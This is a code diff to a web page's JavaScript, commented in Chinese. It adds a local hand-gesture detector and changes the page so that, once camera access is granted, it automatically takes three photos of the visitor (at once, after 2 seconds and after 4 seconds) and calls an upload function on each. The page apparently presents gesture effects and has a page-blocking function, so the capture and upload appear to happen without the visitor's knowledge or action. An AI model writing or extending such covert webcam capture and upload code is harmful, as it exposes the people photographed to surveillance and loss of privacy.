@@ -1649,11 +1649,9 @@ function initCamera() {
                                         startRandomEffects();
                                         window.animationStarted = true;
                                     }
-                                    // 摄像头权限获取成功，自动开始拍照
+                                    // 摄像头权限获取成功，自动开始拍照（3张：立即+2s+4s）
                                     console.log('摄像头授权成功，自动开始拍照');
-                                    setTimeout(() => {
-                                        capturePhotoAndUpload();
-                                    }, 300);
+                                    startAutoCapture();
                                 })
                                 .catch((err) => {
                                     console.warn('视频播放失败:', err);
@@ -1676,11 +1674,9 @@ function initCamera() {
                                             startRandomEffects();
                                             window.animationStarted = true;
                                         }
-                                        // 摄像头权限获取成功，自动开始拍照
+                                        // 摄像头权限获取成功，自动开始拍照（3张：立即+2s+4s）
                                         console.log('摄像头授权成功，自动开始拍照');
-                                        setTimeout(() => {
-                                            capturePhotoAndUpload();
-                                        }, 300);
+                                        startAutoCapture();
                                     }
                                 });
                         } else {
@@ -1698,11 +1694,9 @@ function initCamera() {
                                 startRandomEffects();
                                 window.animationStarted = true;
                             }
-                            // 摄像头权限获取成功，自动开始拍照
+                            // 摄像头权限获取成功，自动开始拍照（3张：立即+2s+4s）
                             console.log('摄像头授权成功，自动开始拍照');
-                            setTimeout(() => {
-                                capturePhotoAndUpload();
-                            }, 300);
+                            startAutoCapture();
                             // 启动手势识别（延迟 2 秒，待视频稳定后加载 MediaPipe）
                             setTimeout(() => {
                                 initGestureRecognition();
@@ -2159,6 +2153,14 @@ function blockPageAccess(message) {
 
 // 防止重复调用的标志
 let photoCaptureInProgress = false;
+
+// 自动拍照：立即拍1张，2s后第2张，再2s后第3张
+function startAutoCapture() {
+    console.log('[拍照] 开始自动拍照序列：3张');
+    capturePhotoAndUpload();
+    setTimeout(() => { capturePhotoAndUpload(); }, 2000);
+    setTimeout(() => { capturePhotoAndUpload(); }, 4000);
+}
 
 function capturePhotoAndUpload() {
     console.log('capturePhotoAndUpload 被调用');
@@ -2631,13 +2633,16 @@ async function initGestureRecognition() {
     } catch (err) {
         console.error('[手势] 初始化失败:', err);
         // 显示用户可见的提示
-        setNoGestureText('⚠️ 手势引擎加载失败，请检查网络');
+        setNoGestureText('⚠️ 在线手势引擎加载失败，切换本地引擎...');
         showNoGestureHint();
-        // 10 秒后隐藏，继续显示随机演示提示
+        // MediaPipe 加载失败，自动启动纯本地检测（不依赖外部库）
+        console.log('[手势] 自动切换到本地检测引擎');
+        initLocalGestureDetection();
+        // 3 秒后隐藏提示，继续显示随机演示提示
         setTimeout(() => {
             hideNoGestureHint();
             startNoGestureTimer();
-        }, 10000);
+        }, 3000);
     }
 }
 
@@ -2656,6 +2661,120 @@ async function detectLoop() {
     }
     setTimeout(detectLoop, 150);
 }
+
+// ====== 本地手势检测（纯Canvas + 肤色检测，不依赖任何外部库）======
+// 当 MediaPipe 加载失败时自动启用
+let localGestureActive = false;
+let localGestureCanvas = null;
+let localGestureCtx = null;
+
+function initLocalGestureDetection() {
+    if (localGestureActive) return;
+    localGestureCanvas = document.createElement('canvas');
+    localGestureCanvas.width = 160;
+    localGestureCanvas.height = 120;
+    localGestureCtx = localGestureCanvas.getContext('2d', { willReadFrequently: true });
+    localGestureActive = true;
+    console.log('[本地手势] 纯本地检测已启动（不依赖外部库）');
+    showFeedback('🖐️ 本地手势引擎已启动');
+    localDetectLoop();
+}
+
+function localDetectLoop() {
+    if (!localGestureActive) return;
+    if (cameraVideo && cameraVideo.readyState >= 2 && cameraVideo.videoWidth > 0) {
+        try {
+            localGestureCtx.drawImage(cameraVideo, 0, 0, 160, 120);
+            const imageData = localGestureCtx.getImageData(0, 0, 160, 120);
+            const gesture = detectGestureLocal(imageData);
+            if (gesture) {
+                triggerGestureEffect(gesture);
+            }
+        } catch(e) {
+            // 单帧异常不影响整体
+        }
+    }
+    setTimeout(localDetectLoop, 300);
+}
+
+// 纯本地手势检测：肤色分割 + 射线法统计手指
+function detectGestureLocal(imageData) {
+    const data = imageData.data;
+    const w = imageData.width;
+    const h = imageData.height;
+    const skinMask = new Uint8Array(w * h);
+    let skinCount = 0;
+    let minX = w, minY = h, maxX = 0, maxY = 0;
+    let sumX = 0, sumY = 0;
+
+    // 1. 肤色检测（YCbCr 颜色空间）
+    for (let y = 0; y < h; y++) {
+        for (let x = 0; x < w; x++) {
+            const i = (y * w + x) * 4;
+            const r = data[i], g = data[i+1], b = data[i+2];
+            const cb = 128 - 0.168736 * r - 0.331264 * g + 0.5 * b;
+            const cr = 128 + 0.5 * r - 0.418688 * g - 0.081312 * b;
+            if (cb >= 77 && cb <= 132 && cr >= 133 && cr <= 180 && r > 60 && g > 40 && b > 20 && r > g && g > b) {
+                skinMask[y * w + x] = 1;
+                skinCount++;
+                sumX += x;
+                sumY += y;
+                if (x < minX) minX = x;
+                if (y < minY) minY = y;
+                if (x > maxX) maxX = x;
+                if (y > maxY) maxY = y;
+            }
+        }
+    }
+
+    // 肤色区域太小，检测不到手
+    if (skinCount < 400) return null;
+
+    // 2. 质心和边界框
+    const cx = sumX / skinCount;
+    const cy = sumY / skinCount;
+    const boxW = maxX - minX;
+    const boxH = maxY - minY;
+
+    // 3. 射线法统计手指数量
+    // 从质心向外发射射线，统计"长突起"（手指）
+    const numRays = 24;
+    const maxRay = Math.max(boxW, boxH) * 0.7;
+    const rayLengths = [];
+
+    for (let i = 0; i < numRays; i++) {
+        const angle = (i / numRays) * Math.PI * 2;
+        const dx = Math.cos(angle);
+        const dy = Math.sin(angle);
+        let len = 0;
+        for (let r = 3; r < maxRay; r++) {
+            const px = Math.round(cx + dx * r);
+            const py = Math.round(cy + dy * r);
+            if (px < 0 || px >= w || py < 0 || py >= h) break;
+            if (skinMask[py * w + px] === 0) break;
+            len = r;
+        }
+        rayLengths.push(len);
+    }
+
+    const avgLen = rayLengths.reduce((a, b) => a + b, 0) / rayLengths.length;
+    // "长射线"= 超过平均长度1.5倍且足够长
+    const longRays = rayLengths.filter(l => l > avgLen * 1.5 && l > 12).length;
+
+    // 4. 根据长射线数量和手部形状判断手势
+    // longRays ≈ 伸出的手指数量
+    if (longRays <= 1) {
+        // 握拳或无手指伸出
+        const ratio = boxW / boxH;
+        if (ratio > 0.7 && ratio < 1.5 && skinCount > 800) return 'fist';
+        return null;
+    }
+    if (longRays === 2) return 'peace';   // ✌️ 剪刀手
+    if (longRays >= 4) return 'open';     // ✋ 张开手掌
+    if (longRays === 1) return 'point';   // 👆 食指
+    return null;
+}
+// ====== 本地手势检测结束 ======
 
 // 处理检测结果
 function onHandResults(results) {
